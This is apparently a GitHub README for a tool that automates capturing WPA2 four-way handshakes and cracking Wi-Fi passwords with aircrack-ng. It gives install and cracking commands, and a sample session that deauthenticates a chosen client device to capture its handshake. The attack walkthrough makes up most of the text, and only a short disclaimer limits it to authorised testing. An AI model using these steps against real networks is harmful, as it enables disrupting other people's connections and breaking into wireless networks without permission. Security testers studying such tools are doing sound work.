# WPA2-Password-Cracker


Automation tool for capturing WPA2 4-way handshake and cracking the password. This automates the process of capturing BSSID and Handshake for a specified Wi-Fi network.



## Installation

### Dependencies
- aircrack-ng
- gnome-terminal
  
**Make sure you have Aircrack-ng and gnome-terminal installed. You can install them on Debian-based systems using:**

```bash
sudo apt update
sudo apt install aircrack-ng
sudo apt install gnome-terminal
```

### Install using dpkg

**Download the .deb File**
- Go to the [Releases](https://github.com/sacheex/WPA2-WIFI-Password-Cracker/releases) section of this repository.
- Find the desired version and download the .deb file
- Navigate to the directory where the .deb file is located
- Run the installation command:
  ```bash
  sudo dpkg -i wpa2hunter
  ```

### Install using git clone


**Clone the repo and navigate to the directory**
```bash
git clone https://github.com/sacheex/WPA2-WIFI-Password-Cracker.git
cd WPA2-Password-Cracker
```
**Make the script executable**
```bash
chmod +x wpa2hunter
```

**Run the script**
```bash
./wpa2hunter
```

**Crack the password**

You can use Wireshark to open the captured file. Make sure you capture the 4-way handshake.

```bash
wireshark <filename>.cap
```
Filter wireshark messages for eapol

**Use Aircrack-ng to crack the password. Provide a password list, such as rockyou.txt, for brute force**

```bash
aircrack-ng <filename>.cap -w <path to password list>
```

### Usage
```bash
$ wpa2hunter

         _       ______  ___   ___   __  ____  ___   __________________ 
        | |     / / __ \/   | |__ \ / / / / / / / | / /_  __/ ____/ __ 
        | | /| / / /_/ / /| | __/ // /_/ / / / /  |/ / / / / __/ / /_/ /
        | |/ |/ / ____/ ___ |/ __// __  / /_/ / /|  / / / / /___/ _, _/ 
        |__/|__/_/   /_/  |_/____/_/ /_/\____/_/ |_/ /_/ /_____/_/ |_|  
                                                                          
                                                                                𝙱𝚢 𝚜𝚊𝚌𝚑𝚎𝚎𝚡
________________________________________________________________________________



Enter network interface: wlan1


PHY     Interface       Driver          Chipset

phy0    wlan0           ath10k_pci      Qualcomm Atheros QCA9377 802.11ac Wireless Network Adapter (rev 31)
phy4    wlan1           rtl8xxxu        Realtek Semiconductor Corp. RTL8188EUS 802.11n Wireless Network Adapter
                (mac80211 monitor mode already enabled for [phy4]wlan1 on [phy4]10)

Enter name of the interface that is on monitor mode: wlan1


Enter "q" two times to quit from capturing BSSID: 


 CH  8 ][ Elapsed: 0 s ][ 2024-01-02 00:31 ][ Are you sure you want to quit? Press Q again to quit.                                                                                                                                          
                                                                                                                                                                                                                                             
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                             
                                                                                                                                                    
 32:C2:**:**:**:**  -65        3        0    0   1  180   WPA2 CCMP   PSK  WIFI                                                                                                                                                         
                                                                                                                                                                                                                                              
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                                                                           
                                                                                                                                                                                                                                             
 32:C2:**:**:**:**  EE:20:52:**:**:**  -58    0 - 1      0       11                                                                                                                                                                          


                                                                                                                                                                                                                                             
Enter BSSID: 32:C2:51:C4:51:D8                                                                                                                                                                                                               

Enter Channel number: 1                                                                                                                                                                                                                      

Enter file name to save captured files: hack1                                                                                                                                                                                                

Options:                                                                                                                                                                                                                                     
                1. Deauth all devices Connected to the network                                                                                                                                                                               
                2. Deauth specified device                                                                                                                                                                                                   
Your choice: 2                                                                                                                                                                                                                               

Enter BSSID of the device: EE:20:52:**:**:**                                                                                                                                                                                                 


Enter "q" two times to quit after capturing Handshake                                                                                                                                                                                        
00:31:54  Created capture file "hack1-01.cap".                                                                                                                                                                                               
                                                                                                                                                                                                                                             
CH  1 ][ Elapsed: 12 s ][ 2024-01-02 00:32 ][ Are you sure you want to quit? Press Q again to quit.                                                                                                                                         
                                                                                                                                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                         
                                                                                                                                                                                                                                             
 32:C2:**:**:**:**  -62   0      103       30    8   1  180   WPA2 CCMP   PSK  WIFI                                                                                                                                                      
                                                                                                                                                                                                                                             
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                                                                           
                                                                                                                                                                                                                                             
 32:C2:**:**:**:**  EE:20:52:**:**:**  -62    1e- 1    134      288  EAPOL  Redmi 9C                                                                                                                                                         
```



# Disclaimer

**Unauthorized access to computer systems and networks is illegal and unethical. This project should only be used in environments where you have explicit permission to test and assess security.**


